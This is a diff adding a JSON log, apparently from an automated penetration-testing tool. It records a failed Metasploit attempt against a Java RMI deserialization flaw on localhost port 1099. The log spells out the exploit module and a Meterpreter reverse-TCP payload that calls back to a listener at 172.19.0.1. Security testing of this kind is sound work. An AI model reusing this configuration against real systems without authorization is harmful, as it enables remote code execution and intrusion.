@@ -1,0 +1,18 @@
+{
+  "timestamp": "2026-04-18T17:49:22.566745",
+  "target": "localhost",
+  "vulnerability": "JAVA-RMI deserialization vulnerability (rmi-vuln-classloader) for RCE",
+  "tool": "metasploit",
+  "module": "exploit/multi/misc/java_rmi_server",
+  "port": 1099,
+  "cvss": 9.8,
+  "confidence": "HIGH",
+  "result": {
+    "success": false,
+    "output": "Module executed, no session after 45s.\nJob: None | Module: exploit/multi/misc/java_rmi_server\nOptions: {\n  \"RHOSTS\": \"localhost\",\n  \"RPORT\": \"1099\",\n  \"PAYLOAD\": \"java/meterpreter/reverse_tcp\",\n  \"LHOST\": \"172.19.0.1\"\n}\nPossible causes: target not vulnerable, firewall blocking callback, wrong payload.",
+    "module": "exploit/multi/misc/java_rmi_server",
+    "vulnerability": "JAVA-RMI deserialization vulnerability (rmi-vuln-classloader) for RCE",
+    "tool": "metasploit",
+    "port": 1099
+  }
+}
